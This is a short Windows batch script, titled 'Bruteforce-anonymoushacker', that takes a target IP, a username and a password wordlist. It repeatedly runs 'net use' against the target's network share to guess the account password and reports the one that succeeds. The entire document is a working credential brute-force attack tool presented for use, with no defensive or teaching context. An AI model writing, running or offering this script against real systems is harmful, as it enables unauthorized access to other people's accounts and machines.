@echo off
title Bruteforce-anonymoushacker
color A
set /p ip='Enter IP:'
set /p user='Enter username:'
set /p wordlist='Enter password List:' 

set /a count=0
for /f %%a in (%wordlist%) do (
 echo %%a
 set pass=%%a
 call :attempt
)
echo Password not Found :(
pause
exit

:success
echo Password Found!: %pass%
net use //%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use //%ip% /user:%user% %pass% >nul 2>&1
echo ATTEMPT: %pass%
if %errorlevel% EQU 0 goto success